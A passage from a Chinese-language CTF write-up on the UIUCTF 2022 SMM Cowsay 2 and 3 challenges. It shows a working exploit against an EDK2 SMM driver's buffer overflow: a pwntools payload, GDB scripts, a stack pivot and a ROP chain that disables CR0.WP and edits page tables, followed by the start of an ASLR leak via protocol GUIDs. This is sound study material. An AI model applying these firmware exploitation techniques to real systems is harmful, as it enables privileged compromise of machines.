class="line"></span><br><span class="line">out:</span><br><span class="line">  DEBUG ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题就出在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span><br></pre></td></tr></table></figure><p>这里我们有一个类似 memcpy 的函数，使用 <code>-&gt;MessageLength</code> 从 <code>EFI_SMM_COMMUNICATE_HEADER</code> 的 <code>-&gt;Data</code> 字段（作为 <code>CommBuffer</code> 传递）执行复制字段作为大小（作为 <code>CommBufferSize</code> 传递）</p><p>那么这里是存在一个溢出的,如果数据大小超过<code>400</code>,那么就会覆盖到<code>CowsayFunc</code>字段</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>情况看起来很简单：发送 400 字节的垃圾，后跟一个地址，并在系统管理模式内获得 RIP 控制。一旦我们有了 RIP 控制，我们就可以构建一个 ROP 链来完成以下二者中的一个操作</p><ul><li>(A)完全禁用分页并读取标志</li><li>(B)关闭 <code>CR0.WP</code> （因为页表是只读的）并修补页面标志的表条目以使其可读。<a href="https://www.cnblogs.com/chingliu/archive/2011/08/28/2223804.html">关于cr0寄存器</a></li></ul><p>方法A是作者的解决方案。事实上，SMM GDT 中已经有一个很好的 32 位保护模式段描述符，我们可以将其用于代码段</p><p>但这里选择使用B方法</p><p>不过，构建 ROP 链存在一些问题：在 <code>call</code> 到我们的地址之后，我们失去了对执行的控制，因为我们无法控制 SMM 堆栈。简单地用我们的 shellcode 缓冲区的地址覆盖函数指针并在 SMM 中执行任意代码会很好，但正如我们之前所看到的，SMM 无法访问该内存区域，这只会导致崩溃。</p><p>qemu启动脚本增加</p><p><code>-global isa-debugcon.iobase=0x402 -debugcon file:../../debug.log</code></p><p>现在可以运行挑战并查看 <code>debug.log</code> 。在各种调试消息中，EDK2 打印它加载的每个驱动程序的基地址和入口点：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> handout/run; ./run.sh; <span class="built_in">cd</span> -</span><br><span class="line">$ <span class="built_in">cat</span> debug.log | grep <span class="string">&#x27;SMM driver&#x27;</span></span><br><span class="line">Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi</span><br><span class="line">Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi</span><br><span class="line">Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC159 PiSmmCpuDxeSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE99E7 SmmCowsay.efi</span><br><span class="line">Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi</span><br></pre></td></tr></table></figure><p>毫无疑问，所有这些驱动程序的 <code>.text</code> 部分都将包含我们可以在 SMM 中执行的代码。让我们使用 EDK2 调试日志提供的基地址来使用 <code>ROPGadget</code> 来查找它们：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> handout/edk2_artifacts</span><br><span class="line">ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 &gt;&gt; ../../gadgets.txt</span><br><span class="line">ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 &gt;&gt; ../../gadgets.txt</span><br><span class="line"><span class="comment"># ... and so on ...</span></span><br></pre></td></tr></table></figure><p>尽管我们有gadget，但我们需要多个gadget来构建有用的 ROP 链。在第一个 <code>ret</code> 之后，如果我们不以某种方式将堆栈（RSP）移动到受控内存区域，控制权将返回到 <code>SmmCowsayHandler</code> ，因此我们需要的第一个gadget是能够将堆栈迁移到我们想要的位置的一个。</p><p>有这么一个非常好的gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MdePkg/Library/BaseLib/X64/LongJump.nasm</span></span><br><span class="line">CetDone:</span><br><span class="line"></span><br><span class="line">    mov     rbx, [rcx]</span><br><span class="line">    mov     rsp, [rcx + <span class="number">8</span>]</span><br><span class="line">    mov     rbp, [rcx + <span class="number">0x10</span>]</span><br><span class="line">    mov     rdi, [rcx + <span class="number">0x18</span>]</span><br><span class="line">    mov     rsi, [rcx + <span class="number">0x20</span>]</span><br><span class="line">    mov     r12, [rcx + <span class="number">0x28</span>]</span><br><span class="line">    mov     r13, [rcx + <span class="number">0x30</span>]</span><br><span class="line">    mov     r14, [rcx + <span class="number">0x38</span>]</span><br><span class="line">    mov     r15, [rcx + <span class="number">0x40</span>]</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    jmp     qword [rcx + <span class="number">0x48</span>]</span><br></pre></td></tr></table></figure><p>我们的函数指针将使用 <code>CommBuffer</code> 作为第一个参数 (RCX) 进行调用，因此跳转到此处将直接从我们提供的数据加载一堆寄存器，包括 RSP。</p><p>这非常好，确实作者的解决方案使用它可以轻松迁移堆栈并继续 ROP 链，但是 <code>ROPgadget</code> 不够聪明，无法为我们找到这个gadget</p><p>所以原作者选用了一种更为复杂的方法</p><h4 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h4><p>无论如何，我们仍然有一个不错的技巧。我们确实无法控制 SMM 堆栈，但是如果我们的某些寄存器溢出到堆栈上怎么办？使用 <code>ret 0x123</code> 或 <code>add rsp, 0x123; ret</code> 形式的gadget，我们将能够向前移动堆栈指针并使用我们在 SMM 堆栈上控制的任何内容作为另一个gadget。为了检查这一点，我们可以将调试器附加到 QEMU 并在 <code>SmmCowsayHandler()</code> 中调用 <code>mDebugData.CowsayFunc()</code> 时中断。</p><p>我们只需在命令行中添加 <code>-s</code> 即可在 QEMU 中启用调试，然后从 GDB 附加到它。</p><p>大佬编写了一个简单的 Python GDB 插件来从 <code>.debug</code> 文件加载调试符号</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddAllSymbols</span>(gdb.Command):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        <span class="built_in">super</span> (AddAllSymbols, self).__init__ (<span class="string">&#x27;add-all-symbols&#x27;</span>,</span><br><span class="line">            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, args, from_tty</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Adding symbols for all EFI drivers...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> line.startswith(<span class="string">&#x27;Loading SMM driver at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">4</span>]</span><br><span class="line">                <span class="keyword">elif</span> line.startswith(<span class="string">&#x27;Loading driver at&#x27;</span>) <span class="keyword">or</span> line.startswith(<span class="string">&#x27;Loading PEIM at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">3</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                path = <span class="string">&#x27;handout/edk2_artifacts/&#x27;</span> + line[-<span class="number">1</span>].replace(<span class="string">&#x27;.efi&#x27;</span>, <span class="string">&#x27;.debug&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                    gdb.execute(<span class="string">&#x27;add-symbol-file &#x27;</span> + path + <span class="string">&#x27; -readnow -o &#x27;</span> + base)</span><br><span class="line"></span><br><span class="line">AddAllSymbols()</span><br></pre></td></tr></table></figure><p>漏洞利用的第一部分与 SMM Cowsay 1 相同：获取 <code>BootServices-&gt;AllocatePool</code> 和 <code>-&gt;LocateProtocol</code> ，找到 <code>SmmCommunication</code> 协议，分配一些内存进行写入我们的消息，并通过其 SMI 处理程序将其发送到 <code>SmmCowsay</code> 。唯一改变的是我们发送的内容：这次 <code>EFI_SMM_COMMUNICATE_HEADER</code> 的 <code>-&gt;Data</code> 字段将填充 400 字节的垃圾字符串，再加上 8 个字节以覆盖函数指针。</p><p>我们将使用易于识别的值填充所有未使用的通用寄存器，以便我们可以看到堆栈上溢出的内容：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span>(<span class="string">&#x27;Attach GDB now and press [ENTER] to continue...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(<span class="number">0x4141414141414141</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ebx, 0x0b0b0b0b</span></span><br><span class="line"><span class="string">    mov esi, 0x01010101</span></span><br><span class="line"><span class="string">    mov edi, 0x02020202</span></span><br><span class="line"><span class="string">    mov ebp, 0x03030303</span></span><br><span class="line"><span class="string">    mov r9 , 0x09090909</span></span><br><span class="line"><span class="string">    mov r10, 0x10101010</span></span><br><span class="line"><span class="string">    mov r11, 0x11111111</span></span><br><span class="line"><span class="string">    mov r12, 0x12121212</span></span><br><span class="line"><span class="string">    mov r13, 0x13131313</span></span><br><span class="line"><span class="string">    mov r14, 0x14141414</span></span><br><span class="line"><span class="string">    mov r15, 0x15151515</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line">conn.interactive() <span class="comment"># Let&#x27;s see what happens</span></span><br></pre></td></tr></table></figure><p>现在我们可以使用以下脚本启动漏洞利用并附加 GDB：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> script.gdb</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> gdb_plugin.py</span><br><span class="line">add-all-symbols</span><br><span class="line"></span><br><span class="line"><span class="built_in">break</span> *(SmmCowsayHandler + 0x302)</span><br><span class="line"><span class="built_in">continue</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb -x script.gdb</span><br><span class="line">...</span><br><span class="line">Breakpoint 1, 0x0000000007ee92c5 <span class="keyword">in</span> SmmCowsayHandler (CommBufferSize=&lt;optimized out&gt;, CommBuffer=0x69bb030, ...</span><br><span class="line">(gdb) i r rax</span><br><span class="line">rax            0x4141414141414141  4702111234474983745</span><br><span class="line"></span><br><span class="line">(gdb) si</span><br><span class="line">0x4141414141414141 <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line">(gdb) x/100gx <span class="variable">$rsp</span></span><br><span class="line">0x7fb6a78:  0x0000000007ee92c7  0x0000000007ffa8d8</span><br><span class="line">0x7fb6a88:  0x0000000007ff0bc5  0x00000000069bb030</span><br><span class="line">0x7fb6a98:  0x0000000007fb6c38  0x0000000007fb6b80</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x7fb6b48:  0x00000000069bb018  0x0000000013131300</span><br><span class="line">0x7fb6b58:  0x0000000014141414  0x0000000015151515</span><br></pre></td></tr></table></figure><p>看起来 R13（除了 LSB）、R14 和 R15 不知何故在 <code>rsp + 0xe0</code> 处溢出到堆栈上。从 <code>call rax</code> 返回后， <code>SmmCowsayHandler</code> 中的代码执行以下操作</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/30i SmmCowsayHandler + 0x302</span><br><span class="line">   0x7ee92c5 &lt;SmmCowsayHandler+770&gt;:    call   rax</span><br><span class="line">   0x7ee92c7 &lt;SmmCowsayHandler+772&gt;:    <span class="built_in">test</span>   bl,bl</span><br><span class="line">   ... a bunch of useless stuff ...</span><br><span class="line">   0x7ee92f7 &lt;SmmCowsayHandler+820&gt;:    add    rsp,0x40</span><br><span class="line">   0x7ee92fb &lt;SmmCowsayHandler+824&gt;:    xor    eax,eax</span><br><span class="line">   0x7ee92fd &lt;SmmCowsayHandler+826&gt;:    pop    rbx</span><br><span class="line">   0x7ee92fe &lt;SmmCowsayHandler+827&gt;:    pop    rsi</span><br><span class="line">   0x7ee92ff &lt;SmmCowsayHandler+828&gt;:    pop    rdi</span><br><span class="line">   0x7ee9300 &lt;SmmCowsayHandler+829&gt;:    pop    r12</span><br><span class="line">   0x7ee9302 &lt;SmmCowsayHandler+831&gt;:    pop    r13</span><br><span class="line">   0x7ee9304 &lt;SmmCowsayHandler+833&gt;:    ret</span><br></pre></td></tr></table></figure><p>因此，在最后一个 <code>ret</code> 时，我们将使寄存器溢出到堆栈上的距离更近。非常方便的是，在我们转储的小工具中，在 <code>VariableSmm.efi + 0x8a49</code> 处有一个 <code>ret 0x70</code> 。我们可以使用这个小工具将 RSP 精确地<strong>移动到溢出的 R14 之上</strong>，从而使我们能够执行另一个 <code>pop rsp; ret</code> 形式的gadget，这将从 R15 的值中获取 RSP 的新值堆栈！在此之后，我们完全控制了堆栈，我们可以编写更长的ROP链。</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h4><p>迁移堆栈并启动真正的 ROP 链后，我们需要以下gadget</p><ul><li>设置 CR0 以便能够禁用 <code>CR0.WP</code> 编辑页表。</li><li>写入任意地址的内存以覆盖标志地址的页表条目。</li><li>从内存读入寄存器以获得标志。</li></ul><p>只要有一点耐心，所有这些都可以轻松找到，因为我们手上有很多gadget</p><p>由于地址不会改变，所以我们实际上不需要担心遍历页表：我们只需使用 GDB 找到 <code>0x44440000</code> 的页表条目的地址，然后将其硬编码到漏洞利用中:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl4_idx</span> = (0x44440000 &gt;&gt; 12 + 9 + 9 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl3_idx</span> = (0x44440000 &gt;&gt; 12 + 9 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl2_idx</span> = (0x44440000 &gt;&gt; 12 + 9) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl1_idx</span> = (0x44440000 &gt;&gt; 12) &amp; 0x1ff</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl4_entry</span> = *(unsigned long *)(<span class="variable">$cr3</span> + 8 * <span class="variable">$lvl4_idx</span>)</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$lvl3_entry</span> = *(unsigned long *)((<span class="variable">$lvl4_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl3_idx</span>)</span><br><span class="line">(gdb) set <span class="variable">$lvl2_entry</span> = *(unsigned long *)((<span class="variable">$lvl3_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl2_idx</span>)</span><br><span class="line"></span><br><span class="line">(gdb) set <span class="variable">$lvl1_entry_addr</span> = (<span class="variable">$lvl2_entry</span> &amp; <span class="number">0</span>xffffffff000) + <span class="number">8</span> * <span class="variable">$lvl1_idx</span></span><br><span class="line">(gdb) set <span class="variable">$lvl1_entry</span>      = *(unsigned long *)<span class="variable">$lvl1_entry_addr</span></span><br><span class="line"></span><br><span class="line">(gdb) printf &quot;PTE at <span class="number">0</span>x%lx, value = <span class="number">0</span>x%<span class="number">016</span>lx\n&quot;, <span class="variable">$lvl1_entry_addr</span>, <span class="variable">$lvl1_entry</span></span><br><span class="line"></span><br><span class="line">PTE at <span class="number">0</span>x7ed0200, value = <span class="number">0</span>x8000000044440066</span><br></pre></td></tr></table></figure><p>请注意 <code>0x8000000044440066</code> 设置位 63 (NX)与位 0 , 1 未设置（不存在，不可读写）。我们需要设置位 0 以便将页面标记为存在，因此我们想要的值为 <code>0x8000000044440067</code> 。</p><p>从 GDB 检查 CR0 的值，我们得到 <code>0x80010033</code> ：关闭 WP 位会得到 <code>0x80000033</code> ，所以这就是我们在尝试编辑页表条目之前要写入 CR0 的内容在 <code>0x7ed0200</code> 。</p><p>找到我们需要的gadegt后，真正的 ROP 链是这样的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ret_0x70 = <span class="number">0x7F83000</span> + <span class="number">0x8a49</span> <span class="comment"># VariableSmm.efi + 0x8a49: ret 0x70</span></span><br><span class="line">payload  = <span class="string">&#x27;A&#x27;</span>.encode(<span class="string">&#x27;utf-16-le&#x27;</span>) * <span class="number">200</span> + p64(ret_0x70)</span><br><span class="line"></span><br><span class="line">real_chain = [</span><br><span class="line">    <span class="comment"># Unset CR0.WP</span></span><br><span class="line">    <span class="number">0x7f8a184</span> , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x80000033</span>, <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fcf70d</span> , <span class="comment"># mov cr0, rax ; wbinvd ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set PTE of flag page as present</span></span><br><span class="line">    <span class="comment"># PTE at 0x7ed0200, original value = 0x8000000044440066</span></span><br><span class="line">    <span class="number">0x7f8a184</span>         , <span class="comment"># pop rax ; ret</span></span><br><span class="line">    <span class="number">0x7ed0200</span>         , <span class="comment"># -&gt; RAX</span></span><br><span class="line">    <span class="number">0x7fc123d</span>         , <span class="comment"># pop rdx ; ret</span></span><br><span class="line">    <span class="number">0x8000000044440067</span>, <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7fc9385</span>         , <span class="comment"># mov dword ptr [rax], edx ; xor eax, eax ;</span></span><br><span class="line">                        <span class="comment"># pop rbx ; pop rbp ; pop r12 ; ret</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line">    <span class="number">0x1337</span>, <span class="comment"># filler</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read flag into RAX and then let everything chain</span></span><br><span class="line">    <span class="comment"># crash to simply leak it from the register dump</span></span><br><span class="line">    <span class="number">0x7ee8222</span> , <span class="comment"># pop rsi ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RSI</span></span><br><span class="line">    <span class="number">0x7fc123d</span> , <span class="comment"># pop rdx ; ret (do not mess up RAX with sub/add)</span></span><br><span class="line">    <span class="number">0x0</span>       , <span class="comment"># -&gt; RDX</span></span><br><span class="line">    <span class="number">0x7ee82fe</span> , <span class="comment"># pop rdi ; ret</span></span><br><span class="line">    <span class="number">0x44440000</span>, <span class="comment"># -&gt; RDI (flag address)</span></span><br><span class="line">    <span class="number">0x7ff7b2c</span> , <span class="comment"># mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>将flag读到rax寄存器中</p><p>然后执行几次即可获得完整的flag</p><h2 id="uictf2022-cowsay3"><a href="#uictf2022-cowsay3" class="headerlink" title="uictf2022-cowsay3"></a>uictf2022-cowsay3</h2><p>题目描述</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">We fired that engineer. Unfortunately, other engineers refused to touch this code, but instead suggested to integrate some ASLR code found online. Additionally, we hardened the system with SMM_CODE_CHK_EN and kept DEP on. Now that we have the monster combination of ASLR+DEP, we should surely be secure, right?</span><br></pre></td></tr></table></figure><p>在之前的基础上又添加了ASLR以及DEP,但好在smmcowsay.efi的代码并没有改变</p><ol><li><p><code>SMM_CODE_CHK_EN</code> 已启用：这是 <code>MSR_SMM_FEATURE_CONTROL</code> MSR中的一个位，它控制SMM是否可以执行其他两个MSR定义的范围之外的代码： <code>IA32_SMRR_PHYSBASE</code> 和 <code>IA32_SMRR_PHYSMASK</code> （基本上在SMRAM之外）。当设置 <code>SMM_CODE_CHK_EN</code> 时， <code>MSR_SMM_FEATURE_CONTROL</code> 的“Lock”位也在 QEMU 中设置，因此无法禁用此检查。</p><p>这并不是真正的问题，因为我们并没有真正在 SMRAM 之外执行任何代码。假设我们找到了正确的小工具，我们已经可以通过一个简单的 ROP 链（利用 SMRAM 中已有的代码）获得我们想要的东西。</p></li><li><p>ASLR 已添加到 EDK2（<a href="https://github.com/jyao1/SecurityEx来自">https://github.com/jyao1/SecurityEx来自</a> jyao1/SecurityEx 的原始补丁，有一些细微的更改）：现在每个驱动程序都加载到不同的地址，该地址会更改每次启动，并使用 <code>rdrand</code> 指令获取 10 位熵。不用说，这使得像我们之前的漏洞利用那样使用硬编码地址变得不可能。</p></li></ol><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>解决ASLR最常见的办法就是泄露一个基址</p><p>我们如何泄露一些SMM地址以击败ASLR？ EDK2 驱动程序注册了一堆协议。每个协议都有自己的 GUID，使用有效的 GUID 调用 <code>BootServices-&gt;LocateProtocol</code> 将返回指向协议结构的指针（如果存在），该结构驻留在实现协议的驱动程序中！这允许我们泄漏实现在执行代码时注册的协议的任何驱动程序的基地址（在简单的减法之后）</p><p>如果我们查看 EDK2 源代码中的文件<a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec">MdePkg/MdePkg.dec</a>，我们会看到一堆针对不同协议的 GUID。甚至无需浪费时间检查源代码的其他部分，我们就可以将它们全部转储并尝试请求其中的每一个，直到找到一个看起来有趣的地址。</p><p>再次，修补 <code>run.sh</code> 脚本，让 QEMU 将 EDK2 调试输出转储到文件中，就像我们对 SMM Cowsay 2 所做的那样，我们可以找到 SMBASE，在编写漏洞利用程序时假设它是 SMRAM 的起始地址。理论上，SMRAM可以在SMBASE之前和之后扩展，根据Intel Doc，SMBASE只是标记用于查找SMI处理程序和保存状态区域的入口点的基地址。</p><p><code>CPU[000]  APIC ID=0000  SMBASE=07FAF000  SaveState=07FBEC00  Size=00000400</code></p><p>现在，使用我们在之前的两个挑战中使用的相同代码，我们可以检查 <code>MdePkg/MdePkg.dec</code> 中列出的每个协议 GUID，并查看返回的地址是否在 SMBASE 之后:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 